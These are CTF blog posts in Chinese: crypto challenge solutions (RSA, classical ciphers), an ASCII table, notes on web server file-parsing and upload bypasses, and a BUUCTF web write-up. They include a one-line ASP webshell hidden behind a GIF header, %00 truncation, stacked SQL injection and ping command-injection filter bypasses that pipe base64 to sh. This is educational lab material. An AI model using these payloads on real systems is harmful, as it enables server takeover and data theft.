p <span class="token operator">=</span> <span class="token number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>
q <span class="token operator">=</span> <span class="token number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
<span class="token comment"># 密文</span>
C <span class="token operator">=</span> <span class="token number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>

d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
<span class="token comment"># 求明文</span>
M <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>C<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>  <span class="token comment"># 快速求幂取模运算</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解出M值：5577446633554466577768879988<br><strong>flag{5577446633554466577768879988}</strong></p>
<h2 id="Windows系统密码"><a href="#Windows系统密码" class="headerlink" title="Windows系统密码"></a>Windows系统密码</h2><p>内容：</p>
<blockquote>
<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</p>
</blockquote>
<p>像hash密码，<strong>常用hash算法：</strong><br><img src="https://img-blog.csdnimg.cn/93de742bfb504a6ebe0ea469b3fe75d1.png" alt="1"><br>先试试MD5，<strong>a7fcb22a88038f35a8f39d503e7f0062</strong>明文为<strong>good-luck</strong><a href="https://www.cmd5.com/">md5解密</a><br><strong>flag{good-luck}</strong></p>
<h2 id="中文电码"><a href="#中文电码" class="headerlink" title="中文电码"></a>中文电码</h2><h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><p>　　中文电码，又称中文商用电码、中文电报码或中文电报明码，原本是于电报之中传送中文信息的方法。它是第一个把汉字化作电子讯号的编码表。<br>　　自摩尔斯电码在1835年发明后，一直只能用来传送英语或以拉丁字母拼写的文字。1873年，法国驻华人员威基杰（S·A·Viguer）参照《康熙字典》的部首排列方法，挑选了常用汉字6800多个，编成了第一部汉字电码本，名为《电报新书》。后由我国的郑观应将其改编成为《中国电报新编》。这是中国最早的汉字电码本。中国人最早研制的电报机华侨商人王承荣从法国回国后，与福州的王斌研制出我国第一台电报机，并呈请政府自办电报。清政府拒不采纳。</p>
<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>　　中文电码可用作电脑里的中文输入法，但因中文电码是“无理码”，记忆困难，一般用户几乎无法熟练地掌握使用。<br>　　在香港，每个有中文姓名的市民的身份证上，均会在他的姓名下面，印有中文电码，外国人取得的入港签证亦有印上。在很多政府或商业机构的表格中，都会要求填写者填写他的中文电码，以便输入电脑。<br>　　美国签证申请表（DS-160表）中，要求申请人填写姓名的中文电码，一些生僻字没有对应的中文电码时，可用“0000”代替。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>　　中文电码表采用了四位阿拉伯数字作代号，从0001到9999按四位数顺序排列，用四位数字表示最多一万个汉字、字母和符号。汉字先按部首，后按笔划排列。字母和符号放到电码表的最尾。后来由于一万个汉字不足以应付户籍管理的要求，又有第二字面汉字的出现。在香港，两个字面都采用同一编码，由输入员人手选择字面；在台湾，第二字面的汉字会在开首补上“1”字，变成5个数字的编码。</p>
<p>密文：<strong>606046152623600817831216121621196386</strong><br><a href="https://dianma.bmcx.com/">中文电码查询</a></p>
<h2 id="凯撒？替换？呵呵"><a href="#凯撒？替换？呵呵" class="headerlink" title="凯撒？替换？呵呵!"></a>凯撒？替换？呵呵!</h2><p><strong>MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}</strong> 注意：得到的 flag 请包上 flag{} 提交, flag{小写字母}<br>MTHJ明显对应flag，<a href="https://quipqiup.com/">quipqiup-cryptoquip和解密</a><br><img src="https://img-blog.csdnimg.cn/b4fc789dba9a46a3a8ba4f652d38fa30.png" alt="1"><br>得到明文转换为小写去掉空格就行了</p>
<h2 id="萌萌哒的八戒-猪圈密码"><a href="#萌萌哒的八戒-猪圈密码" class="headerlink" title="萌萌哒的八戒  (猪圈密码)"></a>萌萌哒的八戒  (猪圈密码)</h2><p><img src="https://img-blog.csdnimg.cn/02203a19c57a41a38b98cea954fd1819.png" alt="1"><br>猪圈密码<a href="http://www.metools.info/code/c90.html">解密</a><br><img src="https://img-blog.csdnimg.cn/0a53834bfbea4db2a0476a2124c505ea.png" alt="1"></p>
<h2 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h2><blockquote>
<p>小明某一天收到一封密信，信中写了几个不同的年份<br>       <strong>辛卯</strong>，<strong>癸巳</strong>，<strong>丙戌</strong>，<strong>辛未</strong>，<strong>庚辰</strong>，<strong>癸酉</strong>，<strong>己卯</strong>，<strong>癸巳</strong>。<br>       信的背面还写有“+<strong>甲子</strong>”，请解出这段密文。</p>
<p>key值：CTF{XXX}</p>
</blockquote>
<h3 id="六十年甲子（干支表）"><a href="#六十年甲子（干支表）" class="headerlink" title="六十年甲子（干支表）"></a>六十年甲子（干支表）</h3><p><img src="https://img-blog.csdnimg.cn/f5fd3210364043a487187ee5536630fd.png" alt="1"><strong>一甲子为60年</strong></p>
<p>辛卯，顺序为第28个 + 甲子(60) –&gt; 88 –&gt; X<br>癸巳，顺序为第30个 + 甲子(60) –&gt; 90 –&gt; Z<br>丙戌，顺序为第23个 + 甲子(60) –&gt; 93 –&gt; S<br>辛未，顺序为第8个 + 甲子(60) –&gt; 68 –&gt; D<br>庚辰，顺序为第17个 + 甲子(60) –&gt; 77 –&gt; M<br>癸酉，顺序为第10个 + 甲子(60) –&gt; 70 –&gt; F<br>己卯，顺序为第16个 + 甲子(60) –&gt; 76 –&gt; L<br>癸巳，顺序为第30个 + 甲子(60) –&gt; 90 –&gt; Z</p>
<p><strong>XZSDMFLZ</strong><br>看了下writeup：<br>先栅栏，后凯撒：</p>
<blockquote>
<p>栅栏fence解码:		<br>因数[2, 4]:<br>分为2栏时，解密结果为：XMZFSLDZ<br>分为4栏时，解密结果为：XSMLZDFZ</p>
</blockquote>
<p>然后分别解密<br>凯撒Caesar解码:		<br>key #0: XMZFSLDZ<br>key #1: WLYERKCY<br>key #2: VKXDQJBX<br>key #3: UJWCPIAW<br>key #4: TIVBOHZV<br>key #5: <strong>SHUANGYU</strong><br>key #6: RGTZMFXT<br>key #7: QFSYLEWS<br>key #8: PERXKDVR<br>key #9: ODQWJCUQ<br>key #10: NCPVIBTP<br>key #11: MBOUHASO<br>key #12: LANTGZRN<br>key #13: KZMSFYQM<br>key #14: JYLREXPL<br>key #15: IXKQDWOK<br>key #16: HWJPCVNJ<br>key #17: GVIOBUMI<br>key #18: FUHNATLH<br>key #19: ETGMZSKG<br>key #20: DSFLYRJF<br>key #21: CREKXQIE<br>key #22: BQDJWPHD<br>key #23: APCIVOGC<br>key #24: ZOBHUNFB<br>key #25: YNAGTMEA</p>
<p>凯撒Caesar解码:		<br>key #0: XSMLZDFZ<br>key #1: WRLKYCEY<br>key #2: VQKJXBDX<br>key #3: UPJIWACW<br>key #4: TOIHVZBV<br>key #5: SNHGUYAU<br>key #6: RMGFTXZT<br>key #7: QLFESWYS<br>key #8: PKEDRVXR<br>key #9: OJDCQUWQ<br>key #10: NICBPTVP<br>key #11: MHBAOSUO<br>key #12: LGAZNRTN<br>key #13: KFZYMQSM<br>key #14: JEYXLPRL<br>key #15: IDXWKOQK<br>key #16: HCWVJNPJ<br>key #17: GBVUIMOI<br>key #18: FAUTHLNH<br>key #19: EZTSGKMG<br>key #20: DYSRFJLF<br>key #21: CXRQEIKE<br>key #22: BWQPDHJD<br>key #23: AVPOCGIC<br>key #24: ZUONBFHB<br>key #25: YTNMAEGA</p>
<p><strong>flag{SHUANGYU}</strong></p>
<h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><blockquote>
<p>p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</p>
</blockquote>
<p>先摆出已知条件：</p>
<blockquote>
<p>c ≡ m e m o d n c≡m^{e} mod n c≡memodn m ≡ c d m o d n m≡c^{d} mod n<br>m≡cdmodn ϕ ( n ) &#x3D; ( p − 1 ) ∗ ( q − 1 ) ϕ(n)&#x3D;(p−1)∗(q−1)<br>ϕ(n)&#x3D;(p−1)∗(q−1) d ∗ e ≡ 1 m o d ϕ ( n ) d∗e≡1 mod ϕ(n) d∗e≡1modϕ(n) d<br>p ≡ d m o d ( p − 1 ) dp≡d mod (p−1) dp≡dmod(p−1) d q ≡ d m o d ( q −<br>1 ) dq≡d mod (q−1) dq≡dmod(q−1)</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum
<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>  <span class="token comment"># q = GCD(a, b) = GCD(b, a%b)</span>
        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">)</span>
        <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q

<span class="token keyword">def</span> <span class="token function">mod_inv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> egcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">%</span> b  <span class="token comment"># 求a模b得逆</span>

p <span class="token operator">=</span> <span class="token number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span>
q <span class="token operator">=</span> <span class="token number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span>
dp <span class="token operator">=</span> <span class="token number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span>
dq <span class="token operator">=</span> <span class="token number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span>
c <span class="token operator">=</span> <span class="token number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span>

invq<span class="token operator">=</span>mod_inv<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>
mp<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dp<span class="token punctuation">,</span>p<span class="token punctuation">)</span>
mq<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>q<span class="token punctuation">)</span>
m<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>invq<span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq
<span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到<strong>noxCTF{W31c0m3_70_Ch1n470wn}</strong></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ASCII码对应表</title>
    <url>/2023/01/09/ASCII%E7%A0%81%E5%AF%B9%E5%BA%94%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> <strong>chr(9) tab空格    chr(10) 换行   chr(13) 回车    Chr(13)&amp;chr(10)  回车换行    chr(32) 空格符    chr(34) 双引号    chr(39) 单引号</strong></p>
<p> <strong>chr(33) !    chr(34) “    chr(35) #    chr(36) $    chr(37)  %    chr(38) &amp;    chr(39) ‘    chr(40) (    chr(41)  )    chr(42) *<br> chr(43) +    chr(44) ,    chr(45) -    chr(46) .    chr(47) &#x2F;</strong></p>
<p> Chr(48) 0    Chr(49) 1    Chr(50) 2    Chr(51) 3     Chr(52) 4    Chr(53) 5    Chr(54) 6    Chr(55) 7     Chr(56) 8    Chr(57) 9</p>
<p> <strong>chr(58)      chr(59) ;    chr(60) &lt;    chr(61) &#x3D;    chr(62) &gt;    chr(63) ?    chr(64) @</strong></p>
<p> chr(65) A    chr(66) B    chr(67) C    chr(68) D     chr(69) E    chr(70) F    chr(71) G    chr(72) H      chr(73) I     chr(74) J<br> chr(75) K    chr(76) L     chr(77) M    chr(78) N    chr(79) O    chr(80) P     chr(81) Q    chr(82) R    chr(83) S    chr(84) T<br> chr(85) U    chr(86) V    chr(87) W    chr(88) X    chr(89) Y    chr(90) Z</p>
<p> <strong>chr(91) [    chr(92) \    chr(93) ]    chr(94) ^    chr(95) _    chr(96) &#96;</strong></p>
<p> chr(97) a    chr(98) b    chr(99) c    chr(100) d     chr(101) e    chr(102) f    chr(103) g    chr(104) h     chr(105) i<br> chr(106) j    chr(107) k    chr(108) l     chr(109) m    chr(110) n    chr(111) o    chr(112) p     chr(113) q    chr(114) r<br> chr(115) s    chr(116) t     chr(117) u    chr(118) v    chr(119) w    chr(120) x     chr(121) y    chr(122) z</p>
<p> <strong>chr(123) {    chr(124) |    chr(125) }    chr(126) ~     chr(127)     chr(128)     chr(153)™    chr(169) ©      chr(174)</strong> ®</p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>文件解析，文件头欺骗</title>
    <url>/2023/01/05/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%B4%E6%AC%BA%E9%AA%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="文件解析漏洞——"><a href="#文件解析漏洞——" class="headerlink" title="文件解析漏洞——"></a>文件解析漏洞——</h1><p>解析漏洞主要说的是一些特殊文件被iis，apache，nginx在某种情况下解释成脚本文件格士的漏洞。</p>
<h2 id="Iis解析漏洞"><a href="#Iis解析漏洞" class="headerlink" title="Iis解析漏洞"></a>Iis解析漏洞</h2><h3 id="1-目录解析"><a href="#1-目录解析" class="headerlink" title="1.目录解析"></a>1.目录解析</h3><p>当网站下建立文件夹的名字为.asp，.asa的文件夹，其目录内的任何扩展名的文件都被iis当作asp文件来解析并执行，如创建目录&#x2F;xxx.asp&#x2F;xx.jpg  xx.jpg被当作asp文件来执行，如果黑客可以控制活上传文件夹路径，就可以不管上传后的图片改不改名都能拿shell。</p>
<h3 id="2-符号后面不被解析——（可使用抓包软件改后缀）"><a href="#2-符号后面不被解析——（可使用抓包软件改后缀）" class="headerlink" title="2.符号后面不被解析——（可使用抓包软件改后缀）"></a>2.符号后面不被解析——（可使用抓包软件改后缀）</h3><p>在这种情况下，分号后面的不被解析，也就是说xxx.asp;.jpg会被服务器看成是xxx.jpg</p>
<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断，如xxx.php.owf.rar ，”.owf”和”.rar”这两种后缀是apache解析不了的，apache就会把xxx.php.owf.rar解析成php.</p>
<p>怎么去判断是不是合法的后缀就是这个漏洞利用关键，测试时把常见的后缀都写上，去测试是不是合法，任意不识别的后缀，逐级向上识别</p>
<h1 id="文件头欺骗漏洞——"><a href="#文件头欺骗漏洞——" class="headerlink" title="文件头欺骗漏洞——"></a>文件头欺骗漏洞——</h1><p>在一句话木马内容前面加入gif89a，如：gif89a &lt;%eval request(“xx”)%&gt; 然后将木马保存为图片的格式，如xxx.jpg，xx.gif文件头欺骗可以用来绕过简单的waf。</p>
<p> <img src="https://img-blog.csdnimg.cn/bf55298bd8f14a2d8b8d9b9813ce976b.png" alt="5"></p>
<h2 id="00截断——"><a href="#00截断——" class="headerlink" title="00截断——"></a>00截断——</h2><p>找到上传漏洞后，打开选择上传的一句话木马，打开抓包软件，进行00截断，把抓到的数据包改为%00</p>
<p><img src="https://img-blog.csdnimg.cn/7a82003694db4edcb8fbde4e1e0f3aa8.png" alt="1"></p>
<p>选取%00</p>
<p><img src="https://img-blog.csdnimg.cn/e8560e2da51d4cb28d0118f8137af159.png" alt="2"></p>
<p>变成16进制</p>
<p> <img src="https://img-blog.csdnimg.cn/0e98b39607174575864baa6e3fb4cda2.png" alt="3"></p>
<p>放包</p>
<p><img src="https://img-blog.csdnimg.cn/2cda82f915804842b99f150d56196ea0.png" alt="4"></p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-web部分做题记录</title>
    <url>/2023/01/03/buuctf-web%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="SUCTF-2019-EasySQL-1"><a href="#SUCTF-2019-EasySQL-1" class="headerlink" title="[SUCTF 2019]EasySQL  1"></a>[SUCTF 2019]EasySQL  1</h2><p><img src="https://img-blog.csdnimg.cn/b565bb2a9657430992b91bbc44e7da14.png" alt="1"><br>传入数字有回显,字母无回显</p>
<p><img src="https://img-blog.csdnimg.cn/f43f0672d814487e8e3ba485eec10a71.png" alt="2"><br>传入1’无回显<br>传入1’ or ‘1’&#x3D;’1有新的回显<br><img src="https://img-blog.csdnimg.cn/3192b758fcd640a7be33dc8f451997b2.png" alt="3"><br>可能存在注入点<br>使用<code>1&#39; order by 4#</code>看看有多少列，试了很多次都不行。试试堆叠注入<br><code>1;show databases;#</code><br><img src="https://img-blog.csdnimg.cn/d736ee3c4872469e8becd01db21751f6.png" alt="4"><br><code>1;show tables;#</code><br><img src="https://img-blog.csdnimg.cn/8948218749ff428986d236abc8a79a21.png" alt="5"><br>后面就进不去了，参考了师傅们的WP，</p>
<blockquote>
<p>select $post[‘query’]||flag from Flag </p>
</blockquote>
<p>这是关键语句！<br>当 sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<br>所以要想办法让 || 不是逻辑或，修改sql_mode为PIPES_AS_CONCAT，然后再次查询</p>
<p><strong>解法一</strong></p>
<blockquote>
<p>1;set sql_mode&#x3D;pipes_as_concat;select 1</p>
</blockquote>
<p>使用<code>set sql_mode=PIPES_AS_CONCAT;</code>将||视为字符串的连接操作符而非或运算符。<br><img src="https://img-blog.csdnimg.cn/dadc8d4a66bf4ab7af9377443c126787.png" alt="6"><br><strong>解法二</strong></p>
<blockquote>
<p>*,1</p>
</blockquote>
<h2 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h2><p>主要考查<strong>命令执行</strong></p>
<p>让我们get传入一个IP<br><img src="https://img-blog.csdnimg.cn/569938c8fcdb447886240ed7bbfec003.png" alt="1"><br>那传一个IP地址看看会发生什么：<br><img src="https://img-blog.csdnimg.cn/983781f716ab4dd0aa80bfe544eba0ce.png" alt="2"><br>后面拼接一个看看：<code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;ls</code><br><img src="https://img-blog.csdnimg.cn/d5cf920fe0bf4f6ea4a7cc2fec2ce939.png" alt="3"><br>不错欸，继续<code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;cat flag.php</code><br><img src="https://img-blog.csdnimg.cn/560f292fac52458eb954a92f641c625b.png" alt="4"><br>过滤了空格。空格的代替有<code>$IFS，$&#123;IFS&#125;，$IFS$9，&lt;，&lt;&gt;，%09，%0a</code>等，最后<code>$IFS$9</code>能用。<br><code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$9flag.php</code><br>flag又被过滤了<br><img src="https://img-blog.csdnimg.cn/6b6bd7f364e64dc1add617a96fb8be44.png" alt="5"><br>到底都是过滤了什么？到index.php看看：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes
<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span>
<span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"

"</span><span class="token punctuation">;</span>
  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token operator">?</span><span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>过滤的不少啊！<strong>伪协议，转义字符</strong>都不能用了用字符替换试试吧<br><code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;b=ag;cat$IFS$9fl$b.php</code><br>查看源码得到flag<br><img src="https://img-blog.csdnimg.cn/6886b988df1241488482cddd05b97ae6.png" alt="6"><br><strong>方法二</strong><br>应该可以将命令进行base64编码，再用base64-d命令来执行，可以用sh来执行<br><code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code> 得到flag<br><strong>方法三</strong><br>师傅们有的用内联执行</p>
<p>所谓内联，就是将反引号内命令的输出作为输入执行</p>
<blockquote>
<p>?ip&#x3D;127.0.0.1;cat$IFS$9`ls`<br>$IFS在Linux下表示为空格<br>$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字<br>由于ls得出来flag.php，index.php。这是会cat出flag.php和index.php</p>
</blockquote>
